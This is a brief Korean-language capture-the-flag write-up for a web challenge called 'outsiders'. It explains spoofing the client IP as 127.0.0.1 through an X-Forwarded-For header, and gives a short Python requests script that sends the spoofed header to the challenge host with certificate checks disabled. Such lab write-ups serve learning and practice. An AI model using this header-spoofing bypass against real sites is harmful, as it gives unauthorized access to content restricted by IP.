![image](https://github.com/DA2RIM/N0PSctf/assets/171825457/1bab3c00-50ef-494d-884d-2356b13a54d1)

outsider라고 하는걸 보니 외부인에게는 플래그를 보여주지 않겠다 하는거 같은데.. 그럼 바꿀껀 ip 정도라고 생각이 들어서 ip를 루프백으로 바꿔서 리퀘스트를 보냄
(최근 풀었었던 드림핵 웹해킹 문제도 X-Forwarded-For 헤더로 아이피를 변조해서 보내는 문제였어서 참고했음)
``` python
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers ={
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "X-Forwarded-For" : '127.0.0.1'
}
response = requests.get("https://nopsctf-outsiders.chals.io/",allow_redirects=True, headers=headers, verify=False)
response.close()

print(response.text)
```

![ousider](https://github.com/DA2RIM/N0PSctf/assets/171825457/faf458fb-2248-43d1-9013-0646df7473e3)

![outsider2](https://github.com/DA2RIM/N0PSctf/assets/171825457/bb14f73e-4298-473b-8f58-d7daf56f2aa7)

